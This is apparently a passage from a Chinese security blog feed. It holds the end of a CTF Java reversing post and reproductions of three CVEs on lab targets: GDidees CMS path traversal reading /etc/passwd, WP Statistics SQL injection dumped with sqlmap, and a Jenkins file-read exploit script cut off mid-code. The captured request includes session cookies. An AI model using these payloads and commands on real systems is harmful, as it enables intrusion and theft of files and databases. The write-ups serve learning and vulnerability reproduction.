class="hljs-variable">C89SYS__</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">C7yyfggl</span> <span class="hljs-operator">=</span> C89SYS__.toUpperCase();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">N9SSCRT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;0123456789&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">D9UUSACR</span> <span class="hljs-operator">=</span> C89SYS__ + C7yyfggl + N9SSCRT;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">SecureRandom</span> <span class="hljs-variable">rf3ffc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureRandom</span>();<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span>  b3f7a__0x337f2a(a98fac77f__3c2a(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">4</span>)).get(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">e3yfbbglsk</span> <span class="hljs-operator">=</span> b3f7a__0x337f2a(a98fac77f__3c2a(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">4</span>)).get(<span class="hljs-number">0</span>);<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;please input password:&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">i3clscwyt</span> <span class="hljs-operator">=</span> scanner.nextLine();<br>        <span class="hljs-keyword">if</span> (e3c7go_to(i3clscwyt,key).equals(e3yfbbglsk)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Login Successful&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;Login Failed&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span>  List&lt;String&gt; <span class="hljs-title function_">b3f7a__0x337f2a</span><span class="hljs-params">(String a783c_7fxf__)</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">f37xcrxedrd_</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jvjeTQVGcDGPgFeC+E90Pz6wYzjcBK49YDx2W+6YFTjk/wma7Oa5J3O2ns8OptbxyNgIvYJf/J4BRJOat0LY2A==&quot;</span>;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">c0fybbg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        List&lt;String&gt; l2crsys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br>        <span class="hljs-type">char</span>[] f117xc = f37xcrxedrd_.toCharArray();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : f117xc) &#123;<br>            c0fybbg.append((<span class="hljs-type">char</span>)(((c &gt;&gt;&gt; <span class="hljs-number">4</span> ^ (c &lt;&lt; <span class="hljs-number">4</span>) ^ (c &gt;&gt;&gt; <span class="hljs-number">4</span>))) &gt;&gt; <span class="hljs-number">4</span>));<br>        &#125;<br>        l2crsys.add(c0fybbg.substring(<span class="hljs-number">0</span>,c0fybbg.length()-<span class="hljs-number">24</span>));<br>        l2crsys.add(c0fybbg.substring(l2crsys.get(<span class="hljs-number">0</span>).length(),c0fybbg.length()));<br>        <span class="hljs-keyword">return</span> l2crsys;<br>    &#125;<br>    <span class="hljs-keyword">public</span>  String <span class="hljs-title function_">a98fac77f__3c2a</span><span class="hljs-params">(<span class="hljs-type">int</span> length)</span> &#123;<br>        <span class="hljs-keyword">if</span> (length &lt; <span class="hljs-number">1</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Length must be positive&quot;</span>);<br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">s7cyscrs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(length);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">randomIndex</span> <span class="hljs-operator">=</span> rf3ffc.nextInt(D9UUSACR.length());<br>            s7cyscrs.append(D9UUSACR.charAt(randomIndex));<br>        &#125;<br>        <span class="hljs-keyword">return</span> s7cyscrs.toString();<br>    &#125;<br>    <span class="hljs-keyword">public</span>  String <span class="hljs-title function_">e3c7go_to</span><span class="hljs-params">(String coysc21k, String k89csbbv)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">while</span> (k89csbbv.getBytes(StandardCharsets.UTF_8).length &lt; <span class="hljs-number">16</span>) &#123;<br>            k89csbbv += k89csbbv;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] keyBytes = k89csbbv.substring(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>).getBytes(StandardCharsets.UTF_8);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">s88vfy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(keyBytes, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">c1ppy</span> <span class="hljs-operator">=</span> Cipher.getInstance(P3WSSK);<br>        c1ppy.init(Cipher.ENCRYPT_MODE, s88vfy);<br>        <span class="hljs-type">byte</span>[] encryptedBytes = c1ppy.doFinal(coysc21k.getBytes(StandardCharsets.UTF_8));<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(encryptedBytes);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据分析取密文和密钥 然后 最后24个字符是key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span>  List&lt;String&gt; <span class="hljs-title function_">b3f7a__0x337f2a</span><span class="hljs-params">(String a783c_7fxf__)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">f37xcrxedrd_</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jvjeTQVGcDGPgFeC+E90Pz6wYzjcBK49YDx2W+6YFTjk/wma7Oa5J3O2ns8OptbxyNgIvYJf/J4BRJOat0LY2A==&quot;</span>;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">c0fybbg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>    List&lt;String&gt; l2crsys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br>    <span class="hljs-type">char</span>[] f117xc = f37xcrxedrd_.toCharArray();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : f117xc) &#123;<br>        c0fybbg.append((<span class="hljs-type">char</span>)(((c &gt;&gt;&gt; <span class="hljs-number">4</span> ^ (c &lt;&lt; <span class="hljs-number">4</span>) ^ (c &gt;&gt;&gt; <span class="hljs-number">4</span>))) &gt;&gt; <span class="hljs-number">4</span>));<br>    &#125;<br>    l2crsys.add(c0fybbg.substring(<span class="hljs-number">0</span>,c0fybbg.length()-<span class="hljs-number">24</span>));<br>    l2crsys.add(c0fybbg.substring(l2crsys.get(<span class="hljs-number">0</span>).length(),c0fybbg.length()));<br>    <span class="hljs-keyword">return</span> l2crsys;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后解密</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDidees CMS本地文件泄露CVE-2023-27179</title>
    <link href="/2024/11/13/cve%E5%A4%8D%E7%8E%B0/GDidees%20CMS%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2CVE-2023-27179/"/>
    <url>/2024/11/13/cve%E5%A4%8D%E7%8E%B0/GDidees%20CMS%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2CVE-2023-27179/</url>
    
    <content type="html"><![CDATA[<h2 id="靶标介绍"><a class="markdownIt-Anchor" href="#靶标介绍"></a> 靶标介绍</h2><p>GDidees CMS v3.9.1及更低版本被发现存在本地文件泄露漏洞，漏洞通过位于 /_admin/imgdownload.php 的 filename 参数进行利用。</p><h2 id="影响范围"><a class="markdownIt-Anchor" href="#影响范围"></a> 影响范围</h2><p>GDidees &lt; v3.9.1</p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="zoomeye"><a class="markdownIt-Anchor" href="#zoomeye"></a> zoomeye</h3><p>app:“GDidees CMS” AND version:❤️.9.1</p><p>(没怎么搜到真实场景)</p><h2 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h2><p>正常先访问页面</p><p>访问接口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/_admin/imgdownload.php?filename=../../../../../../../etc/passwd<br></code></pre></td></tr></table></figure><p>会自动下载得到一张图片</p><p>记事本查看内容，有关于etc/passwd的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false<br></code></pre></td></tr></table></figure><p>按照这个方式访问一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/_admin/imgdownload.php?filename=../../../../../../../flag<br></code></pre></td></tr></table></figure><p>图片用记事本打开有flag</p><hr><p>今天就摸鱼到这里啦</p>]]></content>
    
    
    <categories>
      
      <category>cve复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WP Statistics SQL注入漏洞CVE-2022-4230</title>
    <link href="/2024/11/13/cve%E5%A4%8D%E7%8E%B0/WPStatisticsSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2022-4230/"/>
    <url>/2024/11/13/cve%E5%A4%8D%E7%8E%B0/WPStatisticsSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2022-4230/</url>
    
    <content type="html"><![CDATA[<h2 id="靶标介绍"><a class="markdownIt-Anchor" href="#靶标介绍"></a> 靶标介绍</h2><p>WP Statistics WordPress 插件13.2.9之前的版本不会转义参数，这可能允许经过身份验证的用户执行 SQL 注入攻击。默认情况下，具有管理选项功能 (admin+) 的用户可以使用受影响的功能，但是该插件有一个设置允许低权限用户也可以访问它。</p><h2 id="影响范围"><a class="markdownIt-Anchor" href="#影响范围"></a> 影响范围</h2><p>WP Statistics &lt;= 13.2.9</p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="zoomeye"><a class="markdownIt-Anchor" href="#zoomeye"></a> zoomeye</h3><p>WP Statistics &lt;= 13.2.9</p><p>(可以尝试简单的信息打点一下)</p><h2 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h2><p>进入的前端没东西，进入wp的默认后台<code>/wp-login.php</code></p><p>尝试了admin加弱密码没有得到答案，有提示，用<code>test::test</code>进入后台</p><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-14001431.png" alt="2024-11-14001431"></p><p>登录状态下获取wp的nonce值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/wp-admin/admin-ajax.php?action=rest-nonce<br></code></pre></td></tr></table></figure><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-14001832.png" alt="2024-11-14001832"></p><p>访问该路径，修改 _wpnonce 参数值为获取的随机数。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-keyword">/wp-json/</span>wp-statistics<span class="hljs-keyword">/v2/</span>metabox?_<span class="hljs-attr">wpnonce</span><span class="hljs-operator">=</span><span class="hljs-number">65</span>ec6708a6<span class="hljs-variable">&amp;name</span>=words<span class="hljs-variable">&amp;search_engine</span>=aaa<br></code></pre></td></tr></table></figure><p>有正常回显之后用bp抓包</p><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-14002228.png" alt="2024-11-14002228"></p><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-14002453.png" alt="2024-11-14002453"></p><p>简单一点就是将信息打包放到txt里</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">GET /wp-json/wp-statistics/v2/metabox?<span class="hljs-emphasis">_wpnonce=65ec6708a6&amp;name=words&amp;search_</span>engine=aaa HTTP/1.1<br>Host: eci-2ze4eh8hmzslixc21kh7.cloudeci1.ichunqiu.com<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<span class="hljs-emphasis">*/*</span>;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br>Cookie: wordpress<span class="hljs-emphasis">_ee010dc40d31c06b39eb5002e7a9aa47=test%7C1731687111%7C9wO6Qw1X3rCRP7oSLmcG9pRXCexYDL9STHFqm9DYG0B%7Cbd721a9b5c5f92c900f4375eb0d469d1b64129782d2fe1bca3e8b6d2f80ed9ad; Hm_</span>lvt<span class="hljs-emphasis">_2d0601bd28de7d49818249cf35d95943=1731400049,1731512323; Hm_</span>lpvt<span class="hljs-emphasis">_2d0601bd28de7d49818249cf35d95943=1731512323; HMACCOUNT=3CD5D5569EDE59D9; wordpress_</span>test<span class="hljs-emphasis">_cookie=WP%20Cookie%20check; wordpress_</span>logged<span class="hljs-emphasis">_in_</span>ee010dc40d31c06b39eb5002e7a9aa47=test%7C1731687111%7C9wO6Qw1X3rCRP7oSLmcG9pRXCexYDL9STHFqm9DYG0B%7Cda5ec4d5ee962d9be5c9a94baa663df8092a6c0dd0abf92cf457dde9997fa3ed; wp<span class="hljs-emphasis">_lang=zh_</span>CN; wp-settings-time-1=1731514465<br>Connection: close<br></code></pre></td></tr></table></figure><p>然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -r orange.txt --batch --dbs<br></code></pre></td></tr></table></figure><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-14003034.png" alt="2024-11-14003034"></p><p>查看数据库 wordpress 的所有表；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -r orange.txt --batch -D wordpress --tables<br></code></pre></td></tr></table></figure><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-14003752.png" alt="2024-11-14003752"></p><p>最后进行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -r orange.txt --batch -D wordpress -T flag -columns --dump<br></code></pre></td></tr></table></figure><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-14004342.png" alt="2024-11-14004342"></p>]]></content>
    
    
    <categories>
      
      <category>cve复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jenkins文件读取漏洞CVE-2024-23897</title>
    <link href="/2024/11/12/cve%E5%A4%8D%E7%8E%B0/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9ECVE-2024-23897/"/>
    <url>/2024/11/12/cve%E5%A4%8D%E7%8E%B0/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9ECVE-2024-23897/</url>
    
    <content type="html"><![CDATA[<p>本着只是浮现的原则，这里上一下p神的文章深入的了解一下原理<a href="https://www.leavesongs.com/PENETRATION/jenkins-cve-2024-23897.html">Jenkins文件读取漏洞拾遗（CVE-2024-23897） | 离别歌</a></p><h2 id="靶标介绍"><a class="markdownIt-Anchor" href="#靶标介绍"></a> 靶标介绍</h2><p>Jenkins 2.441及更早版本，以及LTS 2.426.2及更早版本没有禁用其CLI命令解析器的一个功能，该功能会将参数中’@'字符后跟的文件路径替换为该文件的内容，允许未经身份验证的攻击者读取Jenkins控制器文件系统上的任意文件。</p><h2 id="影响范围"><a class="markdownIt-Anchor" href="#影响范围"></a> 影响范围</h2><p>版本&lt;= Jenkins 2.441、版本&lt;= LTS 2.426.2</p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="fofa"><a class="markdownIt-Anchor" href="#fofa"></a> fofa</h3><p>header=“X-Jenkins” || banner=“X-Jenkins” || header=“X-Hudson” || banner=“X-Hudson” || header=“X-Required-Permission: hudson.model.Hudson.Read” || banner=“X-Required-Permission: hudson.model.Hudson.Read” || body=“Jenkins-Agent-Protocols”</p><p>(感觉大部分都是蜜罐，国内的特别多，大抵需要充钱才能找到有用信息)</p><h2 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h2><p>先进入前端页面</p><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-12165824.png" alt="2024-11-12165824"></p><p>拼接输入<code>jnlpJars/jenkins-cli.jar</code>可以下载到jar文件,例如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">http://39.106.48.123:29826/jnlpJars/jenkins-cli.jar<br></code></pre></td></tr></table></figure><p>然后进入kali里面进行以下的操作</p><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-12170917.png" alt="2024-11-12170917"></p><p>写题目就是到这里，简单的利用漏洞，原理参考开头的文章</p><h2 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">This script is used to exploit CVE-2024-23897 (Jenkins file-read).</span><br><span class="hljs-string">This script was created to parse the output file content correctly.</span><br><span class="hljs-string">Limitations: https://www.jenkins.io/security/advisory/2024-01-24/#binary-files-note</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Imports</span><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">from</span> cmd <span class="hljs-keyword">import</span> Cmd<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> uuid<br><br><br><span class="hljs-comment"># Constants</span><br>RED = <span class="hljs-string">&quot;\033[91m&quot;</span><br>GREEN = <span class="hljs-string">&quot;\033[92m&quot;</span><br>YELLOW = <span class="hljs-string">&quot;\033[93m&quot;</span><br>ENDC = <span class="hljs-string">&quot;\033[0m&quot;</span><br>ENCODING = <span class="hljs-string">&quot;UTF-8&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Terminal</span>(<span class="hljs-title class_ inherited__">Cmd</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;This class provides a terminal prompt for file read attempts.&quot;&quot;&quot;</span><br><br>    intro = <span class="hljs-string">&quot;Welcome to the Jenkins file-read shell. Type help or ? to list commands.\n&quot;</span><br>    prompt = <span class="hljs-string">&quot;file&gt; &quot;</span><br>    file = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, read_file_func</span>):<br>        <span class="hljs-variable language_">self</span>.read_file = read_file_func<br>        <span class="hljs-built_in">super</span>().__init__()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_cat</span>(<span class="hljs-params">self, file_path</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Retrieve file contents.&quot;&quot;&quot;</span><br>        <span class="hljs-variable language_">self</span>.read_file(file_path)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_exit</span>(<span class="hljs-params">self, *args</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Exit the terminal.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    default = do_cat<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Op</span>:<br>    ARG = <span class="hljs-number">0</span><br>    LOCALE = <span class="hljs-number">1</span><br>    ENCODING = <span class="hljs-number">2</span><br>    START = <span class="hljs-number">3</span><br>    EXIT = <span class="hljs-number">4</span><br>    STDIN = <span class="hljs-number">5</span><br>    END_STDIN = <span class="hljs-number">6</span><br>    STDOUT = <span class="hljs-number">7</span><br>    STDERR = <span class="hljs-number">8</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_upload_request</span>(<span class="hljs-params">uuid_str, file_path</span>):<br>    time.sleep(<span class="hljs-number">0.3</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># Construct payload</span><br>        data = (<br>            jenkins_arg(<span class="hljs-string">&quot;connect-node&quot;</span>, Op.ARG)<br>            + jenkins_arg(<span class="hljs-string">&quot;@&quot;</span> + file_path, 